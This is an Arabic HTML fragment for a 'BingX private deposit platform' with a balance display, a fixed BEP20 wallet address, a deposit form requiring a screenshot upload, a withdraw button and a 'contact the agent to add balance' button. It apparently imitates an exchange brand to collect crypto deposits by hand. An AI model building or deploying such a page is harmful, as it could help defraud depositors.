<div class="container">
    <h1>منصة الإيداع الخاصة BingX</h1>

    <div id="balance">
        <p>الرصيد الحالي: <span id="current-balance">0.00</span> USDT</p>
    </div>

    <div id="wallet-info" class="wallet-box">
        <p><strong>عنوان المحفظة:</strong><br> 0x3932890a5d1acb3ab036bd39ade26c47929b37e5</p>
        <p><strong>الشبكة:</strong> BEP20</p>
    </div>

    <div class="transaction-section">
        <h2>إيداع</h2>
        <input type="number" id="deposit-amount" placeholder="أدخل المبلغ للإيداع" required>
        <input type="file" id="deposit-image" accept="image/*" required>
        <button class="action-button" onclick="deposit()">إيداع</button>
        <p id="deposit-status" class="hidden">إيداعك قيد الانتظار...</p>
    </div>

    <div class="transaction-section">
        <h2>سحب</h2>
        <input type="number" id="withdraw-amount" placeholder="أدخل المبلغ للسحب" required>
        <button class="action-button" onclick="withdraw()">سحب</button>
    </div>

    <div class="admin-section">
        <h2>إضافة رصيد</h2>
        <button class="action-button" onclick="requestBalanceUpdate()">تواصل مع الوكيل لإضافة رصيد</button>
    </div>
</div>
